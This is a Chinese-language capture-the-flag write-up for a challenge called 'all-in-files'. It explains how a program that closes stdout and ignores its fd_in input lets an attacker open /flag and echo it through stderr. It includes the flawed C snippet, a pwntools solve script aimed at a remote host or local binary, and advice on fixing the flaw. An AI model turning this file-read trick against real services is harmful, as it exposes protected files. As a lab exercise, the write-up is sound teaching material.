# all-in-files

## 题目简述

题目让用户输入文件名、读取文件描述符和输出文件描述符。程序在打开文件前主动关闭 `stdout`，而读取时又忽略用户输入的 `fd_in`，直接使用 `open()` 的返回值。因此只需打开 `/flag`，再把内容写到仍连接客户端的 `stderr` 即可。

## 解题过程

核心代码如下：

```c
close(1);
int file_fd = open(filename, 0);
read(file_fd, filebuf, 0x1ff);
write(fd_out, filebuf, 0x1ff);
```

Linux 总是分配当前最小的空闲文件描述符。进程通常以 `stdin=0`、`stdout=1`、`stderr=2` 启动；关闭 1 后，`open("/flag", O_RDONLY)` 会复用描述符 1。源码虽然询问 `fd_in`，但该变量此后从未使用，真正的读取对象始终是 `file_fd`。输出选择 2，则数据经 `stderr` 返回到网络连接。

文件名由 `read()` 获取，换行不会被自动去除，所以这里必须发送原始字节 `/flag`，不能使用 `sendline()`，否则程序会尝试打开带换行的 `/flag\n`。

```python
import sys
from pwn import process, remote

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process("./fd")

io.sendafter(b"Input filename to open: ", b"/flag")
io.sendlineafter(b"Input file id to read from: ", b"0")  # 实际未使用
io.sendlineafter(b"Input file id to write to: ", b"2")
io.interactive()
```

## 方法总结

本题考查文件描述符复用和数据流审计。不要只看程序向用户询问了什么，还要追踪该变量是否真的参与后续调用；同时要区分 `send()` 与自动追加换行的 `sendline()`。修复时应实际使用并校验 `fd_in`，不要关闭标准输出后再依赖隐式描述符编号。
